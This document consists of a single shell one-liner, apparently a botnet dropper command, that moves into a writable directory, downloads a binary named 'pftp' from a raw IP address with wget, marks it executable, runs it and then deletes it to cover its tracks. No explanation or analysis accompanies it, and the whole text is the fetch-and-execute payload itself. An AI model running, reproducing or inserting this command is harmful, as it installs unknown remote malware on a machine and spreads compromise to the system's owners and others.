cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://45.76.167.153/pftp; chmod +x pftp; ./pftp; rm -rf pftp
